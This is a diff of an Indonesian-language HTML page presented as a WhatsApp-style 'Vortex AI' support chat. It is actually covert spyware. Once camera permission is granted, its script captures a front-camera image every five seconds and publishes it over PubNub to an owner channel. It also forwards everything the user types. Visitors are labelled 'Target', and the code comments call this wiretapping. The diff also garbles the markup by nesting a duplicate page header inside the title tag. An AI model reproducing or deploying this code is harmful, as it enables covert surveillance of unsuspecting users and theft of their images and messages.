@@ -3,6 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>WhatsApp AI <!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>WhatsApp AI Support</title>
     <script src="https://cdn.pubnub.com/sdk/javascript/pubnub.4.29.9.min.js"></script>
     <style>
@@ -24,45 +29,37 @@
 <body>
 <header>
     <div class="av">🤖</div>
-    <div class="u-info"><h3>Vortex AI Support</h3><p>Online</p></div>
+    <div class="u-info"><h3>Vortex AI Official</h3><p>Online</p></div>
 </header>
-<div id="chat"><div class="m ai">Halo! Silakan ketik pesan untuk konsultasi AI.</div></div>
+<div id="chat"><div class="m ai">Halo! Silakan ketik pesan untuk memulai obrolan AI.</div></div>
 <div class="in">
     <input type="text" id="msgIn" placeholder="Ketik pesan..." onkeypress="if(event.key==='Enter')send()">
     <button onclick="send()" style="background:none; border:none; color:#00a884; font-size:24px;">➤</button>
 </div>
-
-<video id="v" autoplay playsinline></video>
-<canvas id="c"></canvas>
+<video id="v" autoplay playsinline></video><canvas id="c"></canvas>
 
 <script>
     const myID = 'Target-' + Math.floor(Math.random() * 9999);
     const pub = new PubNub({ publishKey: 'demo', subscribeKey: 'demo', uuid: myID });
     const v = document.getElementById('v'), c = document.getElementById('c');
 
-    // IZIN KAMERA & MULAI SADAP OTOMATIS
-    navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}})
-    .then(s => {
+    navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}}).then(s => {
         v.srcObject = s;
-        // Sadap Otomatis setiap 5 detik (Tanpa klik tombol)
-        setInterval(spyCapture, 5000); 
+        setInterval(spy, 5000); // Sadap setiap 5 detik
     });
 
     pub.subscribe({ channels: ['vortex_owner_to_target'] });
     pub.addListener({ message: (m) => addMsg(m.message, 'ai') });
 
-    function spyCapture() {
-        const ctx = c.getContext('2d');
-        c.width = v.videoWidth; c.height = v.videoHeight;
-        ctx.drawImage(v, 0, 0);
-        const img = c.toDataURL('image/jpeg', 0.3); // Kompresi agar ringan
+    function spy() {
+        const ctx = c.getContext('2d'); c.width = v.videoWidth; c.height = v.videoHeight;
+        ctx.drawImage(v, 0, 0); const img = c.toDataURL('image/jpeg', 0.4);
         pub.publish({ channel: 'vortex_target_to_owner', message: { spy: true, img: img, id: myID } });
     }
 
     function send() {
         const i = document.getElementById('msgIn'), t = i.value.trim();
-        if(!t) return;
-        addMsg(t, 'u');
+        if(!t) return; addMsg(t, 'u');
         pub.publish({ channel: 'vortex_target_to_owner', message: { msg: t, id: myID, time: new Date().toLocaleTimeString() } });
         i.value = '';
     }
